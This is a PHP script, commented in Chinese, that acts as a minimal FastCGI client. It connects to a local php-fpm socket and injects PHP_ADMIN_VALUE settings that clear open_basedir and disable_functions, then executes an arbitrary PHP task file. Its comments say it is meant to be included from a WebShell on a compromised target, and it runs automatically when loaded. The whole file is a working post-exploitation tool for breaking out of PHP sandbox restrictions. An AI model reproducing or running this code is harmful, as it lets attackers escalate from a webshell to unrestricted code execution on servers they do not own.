<?php
// 最简 FastCGI 客户端：把 /tmp/php-cgi-<ver>.sock 当 php-fpm 后端，覆盖 PHP_ADMIN_VALUE
// 依赖：目标有任意 PHP 执行点（WebShell include 本文件即可）
function fcgi_nv($n, $v) {
    $r = "";
    if (strlen($n) < 128) { $r .= chr(strlen($n)); }
    else { $r .= chr((strlen($n) >> 24) & 0xFF).chr((strlen($n) >> 16) & 0xFF).chr((strlen($n) >> 8) & 0xFF).chr(strlen($n) & 0xFF); }
    if (strlen($v) < 128) { $r .= chr(strlen($v)); }
    else { $r .= chr((strlen($v) >> 24) & 0xFF).chr((strlen($v) >> 16) & 0xFF).chr((strlen($v) >> 8) & 0xFF).chr(strlen($v) & 0xFF); }
    return $r . $n . $v;
}
function fcgi_h($t, $c) {           // version=1, requestId=1
    $len = strlen($c);
    $pad = (8 - ($len % 8)) % 8;
    return chr(1).chr($t).chr(0).chr(1).chr(($len >> 8) & 0xFF).chr($len & 0xFF)
         . chr($pad).chr(0).$c.str_repeat(chr(0), $pad);
}
function run_fcgi($SOCK, $SCRIPT, $ADMIN) {
    $P = array(
        "GATEWAY_INTERFACE" => "FastCGI/1.0",
        "REQUEST_METHOD"    => "GET",
        "SCRIPT_FILENAME"   => $SCRIPT,     // 可以是文件系统上任意 .php（含 /tmp）
        "SCRIPT_NAME"       => "/x.php",
        "QUERY_STRING"      => "",
        "REQUEST_URI"       => "/x.php",
        "DOCUMENT_ROOT"     => "/tmp",
        "SERVER_PROTOCOL"   => "HTTP/1.0",
        "REMOTE_ADDR"       => "127.0.0.1",
        "REMOTE_PORT"       => "44444",
        "SERVER_ADDR"       => "127.0.0.1",
        "SERVER_PORT"       => "80",
        "SERVER_NAME"       => "localhost",
        "SERVER_SOFTWARE"   => "nginx",
        "CONTENT_LENGTH"    => "0",
        "PHP_ADMIN_VALUE"   => $ADMIN,
        "PHP_VALUE"         => $ADMIN,
    );
    $e1 = 0; $e2 = "";
    $s = @stream_socket_client("unix://".$SOCK, $e1, $e2, 5);
    if (!$s) { echo "SOCK_FAIL ".$SOCK." ".$e2."\n"; return; }
    stream_set_timeout($s, 60);
    @fwrite($s, fcgi_h(1, chr(0).chr(1).chr(0).chr(0).chr(0).chr(0).chr(0).chr(0))); // FCGI_BEGIN_REQUEST, role=RESPONDER
    $blob = "";
    foreach ($P as $k => $v) { $blob .= fcgi_nv($k, $v); }
    @fwrite($s, fcgi_h(4, $blob));   // FCGI_PARAMS
    @fwrite($s, fcgi_h(4, ""));      // end of PARAMS
    @fwrite($s, fcgi_h(5, ""));      // FCGI_STDIN (EOF)
    $out = "";
    while (!feof($s)) {
        $h = @fread($s, 8);
        if (strlen($h) < 8) { break; }
        $t = ord($h[1]);
        $len = (ord($h[4]) << 8) + ord($h[5]);
        $pad = ord($h[6]);
        $c = ""; $need = $len;
        while ($need > 0) {
            $b = @fread($s, $need);
            if ($b === false or $b === "") { break; }
            $c .= $b; $need -= strlen($b);
        }
        if ($pad > 0) { @fread($s, $pad); }
        if ($t == 6) { $out .= $c; }   // FCGI_STDOUT
        if ($t == 3) { break; }        // FCGI_END_REQUEST
    }
    @fclose($s);
    echo $out;
}
// ---- 用法 ----
// 先 file_put_contents("/tmp/fcgi_task.php", $你的PHP代码);
// 再 run_fcgi("/tmp/example.com", "/tmp/fcgi_task.php", "open_basedir=/\ndisable_functions=");
if (!isset($NO_AUTORUN)) {
    foreach (array("/tmp/example.com", "/tmp/example.com") as $sk) {
        run_fcgi($sk, "/tmp/fcgi_task.php", "open_basedir=/\ndisable_functions=");
    }
}
// 任务文件示例（注意：走 SCRIPT_FILENAME 执行，必须带 <?php 标签；若用 include 则不要带）
// <?php echo "OB=[".ini_get("open_basedir")."] DF_LEN=".strlen(ini_get("disable_functions"));
